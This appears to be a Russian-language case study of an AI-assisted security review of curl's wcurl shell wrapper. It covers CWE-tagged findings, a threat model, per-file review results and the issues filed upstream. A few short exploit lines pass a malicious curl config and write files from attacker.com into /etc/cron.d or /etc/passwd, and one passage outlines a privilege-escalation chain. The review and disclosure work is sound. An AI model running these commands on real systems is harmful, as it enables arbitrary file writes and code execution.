# Case Study: wcurl.sh (curl team, POSIX sh wrapper)

**Четвёртый dogfood-кейс** — после `RequestFilter-java`, `packet-btl2cap-c`, `cve-2026-94266-spec`.

**Первый shell-скрипт.** Production-код от curl team (GitHub: curl/wcurl).

## О материале

- **Файл:** `wcurl` (POSIX sh wrapper around curl)
- **Источник:** https://github.com/curl/wcurl
- **Размер:** 12 926 chars (обрезан до 12 000)
- **Строк:** ~500
- **Язык:** POSIX shell (sh)
- **Роль:** wrapper вокруг curl — argv parser, percent-decode, version gates

## Метрики анализа (v5.10.7)

| Метрика | Значение |
|---|---|
| Level | **D3** |
| Route | stage0 -> stage1 -> stage2 -> stage4 -> stage5 |
| Session | sess-2026-10-14-233330 |
| Audit ID | audit-2026-10-14-531639 |
| Material hash | sha256:f13c8228d493f185... |
| PII | false |
| Completeness | ACCEPTABLE, loss_pct: 0.0% |

## Что Vishap нашёл

**11 risk_nodes** (4 критичных, 5 важных, 2 опционально) + **11 угроз STRIDE**.

### Критичные

| ID | Риск | CWE |
|---|---|---|
| **SEC-1** | Command injection через `--curl-options` (unquoted `set -- ${CURL_OPTIONS}`) | CWE-88 |
| **SEC-2 / RN-6** | Path traversal через `--output` (нет валидации `OUTPUT_PATH`) | CWE-22 |
| **SEC-3 / RN-1** | Parsing `curl --version` через `cut -f2 -d' '` (locale breaks) | CWE-345 |
| **SEC-4** | Нет scheme allowlist (`--proto-default https`, но не `--proto =http,https`) | CWE-939 |

### Важные

- RN-5: комментарий «options are global», но `CURL_OPTIONS` применяется per-URL.
- RN-8 / FP-1: `exec "$@"` заменяет процесс -- нет логирования/ретрая.
- FP-6: нет `--connect-timeout` / `--max-time` -> зависание.
- RN-11: молчаливая деградация на curl < 7.83/7.66/8.16.
- RN-10: при `--output` + multi-URL + `--parallel` порядок суффиксов недетерминирован.
- RN-2: curl 9.x и форки с суффиксами не обрабатываются.

## Проверено вручную (senior review)

**SEC-1 -- подтверждено:**

```sh
L141:  set -- ${CURL_OPTIONS}                              # unquoted
L284:  set -- "$@" ... ${CURL_OPTIONS} --url "${url}"      # unquoted
L303:  CURL_OPTIONS="${CURL_OPTIONS} ${opt}"               # from --curl-options=
L311:  CURL_OPTIONS="${CURL_OPTIONS} ${1}"                 # from --curl-options <arg>
```

**Exploit:**
```bash
wcurl --curl-options "--config /etc/evil" https://example.com
```
-> `curl --config /etc/evil` -> чтение произвольного конфига -> RCE

**SEC-2 -- подтверждено:**

```sh
L318-321: --output=*) opt=...; OUTPUT_PATH="${opt}"    # без валидации
L324-330: -o|-O|--output) OUTPUT_PATH="${1}"           # без валидации
```

**Exploit:**
```bash
wcurl --output /etc/cron.d/evil https://attacker.com/script
wcurl --output ../../etc/passwd https://attacker.com/data
```
-> при root -- произвольная запись

**SEC-4 -- частично:**
```sh
L114:  --proto-default https \
```
Не запрещает `file://`, `gopher://`, `dict://`. Правильно: `--proto "=http,https"`.

## Senior-level находки

### INTERSECTION_RISKS -- exploit chain

> SEC-2 x SEC-4: `file://` + `--output /etc/cron.d/x` -> чтение произвольного файла + запись в системный путь = escalation от root.

### THREAT_MODEL -- 4 trust boundaries

- TB-1: caller -> argv (untrusted)
- TB-2: wcurl -> curl (exec)
- TB-3: wcurl -> filesystem (write)
- TB-4: wcurl -> network

### SILENCE_LAYERS

> Assumption silence: предполагается, что curl в PATH -- настоящий; нет hash/which, нет LC_ALL=C, нет fallback.

## Нюансы -- Vishap прав, но есть контекст

1. **`wcurl` -- wrapper.** Авторы **намеренно** разрешают любые curl-опции через `--curl-options` (L78: use `--config <FILE>`).
2. **`--output` -- фича.** Пользователь явно указывает, куда сохранять.
3. **`--proto-default https`** -- уже лучше, чем ничего.

**Реальные риски:**
- `wcurl` как **библиотека** в других скриптах.
- **Root-запуск** с недоверенными параметрами.
- **CI/CD** с пользовательскими URL.

## Сравнение с SAST

| Инструмент | Что даёт |
|---|---|
| **ShellCheck** | `SC2086` (unquoted) -- синтаксис |
| **Vishap** | 11 рисков + STRIDE + exploit chain + PLAN_B -- семантика |

## Отправлено в upstream

**Issue #108** -- hardening suggestions (argument handling + output path):
https://github.com/curl/wcurl/issues/108

**Issue #109** -- process-level observations (CVE window, breaking change, exit codes):
https://github.com/curl/wcurl/issues/109

Черновики:
- `C:/AI/wcurl-hardening-suggestion.md`
- `C:/AI/wcurl-process-issue-draft.md`

Тон: hardening suggestion + process review (не багрепорт).
Caveat: не claiming CVE, `--curl-options` -- by design.

## Full project review (13 files)

After the initial shell + docs review, we analyzed **every file** in the wcurl repository.

| # | File | Level | Verdict | Cost |
|---|---|---|---|---|
| 1 | `wcurl` (shell) | D3 | REQUIRES_REVIEW | $0.0085 |
| 2 | `test.yml` (CI) | D3 | **REQUIRES_REVIEW** | $0.0071 |
| 3 | `wcurl.1` (roff manpage) | D3 | **REQUIRES_REVIEW** | $0.0062 |
| 4 | `wcurl.md` (markdown manpage) | D3 | REQUIRES_REVIEW | $0.0063 |
| 5 | `README.md` | D3 | REQUIRES_REVIEW | $0.0074 |
| 6 | `CHANGELOG.md` | D3 | REQUIRES_REVIEW | $0.0066 |
| 7 | `tests.sh` | D3 | SAFE | $0.0074 |
| 8 | `dependabot.yml` | D1 | SAFE | $0.0051 |
| 9 | `requirements.txt` | D1 | SAFE | $0.0042 |
| 10 | `REUSE.toml` | D1 | SAFE | $0.0052 |
| 11 | `AUTHORS` | D1 | REQUIRES_REVIEW | $0.0040 |
| 12 | `LICENSE` | D1 | SAFE | $0.0044 |
| 13 | `LICENSES/curl.txt` | D1 | SAFE | $0.0035 |

**Total:** 13 files analyzed, ~$0.07, ~30 findings (9 critical).

### CI + tests findings (issue #110)

- `test.yml:136` -- `git clone --revision` (non-standard flag; fedora job broken).
- `test.yml:41` + `:70` -- `permissions: {}` contradicts `secrets.GITHUB_TOKEN`.
- `test.yml:58,72,77,83,89,101` -- hardcoded `/home/linuxbrew/.linuxbrew/bin/brew` (6x).
- `tests.sh:199` -- `assertEquals` argument order swapped.
- `tests.sh:288,295` -- assert messages copied from a different test.
- `tests.sh:76-84` -- TODO without version guard.
- `tests.sh` -- curl return code (`$?`) not checked.

### Files in this directory

- `wcurl.sh` -- the shell script under review.
- `report_sess-2026-10-14-233330.md` + `.json` -- shell review (D3).
- `report_sess-2026-10-15-061653-0X.md` + `.json` -- docs (CHANGELOG, README, wcurl.md).
- `report_sess-2026-10-15-083709.md` + `.json` -- CI (`test.yml`, 3 critical).
- `report_sess-2026-10-15-083849.md` + `.json` -- tests (`tests.sh`, 4 bugs).
- `report_sess-2026-10-15-0840XX.md` + `.json` -- `dependabot.yml`, `requirements.txt`.
- `report_sess-2026-10-15-0844XX.md` + `.json` -- `REUSE.toml`, `AUTHORS`.
- `report_sess-2026-10-15-0906XX.md` + `.json` -- `LICENSE`, `curl.txt`, `wcurl.1`.

### Upstream issues filed

- **#108** -- https://github.com/curl/wcurl/issues/108 (hardening).
- **#109** -- https://github.com/curl/wcurl/issues/109 (process).
- **#110** -- https://github.com/curl/wcurl/issues/110 (CI + tests).

Plus an email to `daniel@haxx.se` with feedback on CVE-2026-94266 advisory.


## Выводы

1. **Vishap работает на shell** -- 4-й тип материала (Java + C + spec + sh).
2. **D3, 11 risk_nodes, 4 critical** -- сравнимо с SAST-инструментами.
3. **Подтверждено вручную** -- SEC-1/SEC-2 реальные, SEC-4 частично.
4. **Vishap связал уязвимости** в exploit chain -- senior-level.
5. **Письмо curl team** -- опционально (см. следующий шаг).
